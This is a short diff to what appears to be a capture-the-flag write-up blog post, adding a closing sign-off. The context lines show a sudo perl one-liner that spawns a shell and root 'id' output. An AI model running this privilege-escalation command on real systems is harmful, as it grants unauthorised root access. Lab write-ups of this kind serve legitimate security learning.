@@ -289,3 +289,6 @@ sudo /usr/bin/perl -e 'exec "/bin/sh";'
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!
+
+Happy hacking!
